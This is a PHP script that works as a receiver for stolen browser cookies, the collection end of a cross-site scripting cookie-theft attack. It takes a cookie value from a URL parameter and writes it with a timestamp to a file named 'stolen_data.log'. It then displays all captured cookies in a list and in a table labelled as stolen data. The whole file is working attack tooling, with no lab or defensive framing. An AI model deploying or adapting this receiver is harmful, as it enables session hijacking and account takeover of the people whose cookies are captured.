<?php
$logFile = 'stolen_data.log';
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No cookie received';
$data = "[" . date('Y-m-d H:i:s') . "] " . $cookie . "\n";

file_put_contents($logFile, $data, FILE_APPEND);

echo "Data received.";
echo "<h2>Stolen Data Log:</h2>";
if (file_exists($logFile)) {
    $stolenData = file_get_contents($logFile);
    echo "<pre>" . htmlspecialchars($stolenData) . "</pre>";
} else {
    echo "<p>No data available.</p>";
}
echo "<h2>Stolen Data Log (Table Format):</h2>";
if (file_exists($logFile)) {
    $stolenData = file($logFile, FILE_IGNORE_NEW_LINES);
    echo "<table border='1'>";
    echo "<tr><th>Timestamp</th><th>Cookie Data</th></tr>";
    foreach ($stolenData as $line) {
        if (preg_match('/\[(.*?)\] (.*)/', $line, $matches)) {
            echo "<tr>";
            echo "<td>" . htmlspecialchars($matches[1]) . "</td>";
            echo "<td>" . htmlspecialchars($matches[2]) . "</td>";
            echo "</tr>";
        }
    }
    echo "</table>";
} else {
    echo "<p>No data available.</p>";
}

?>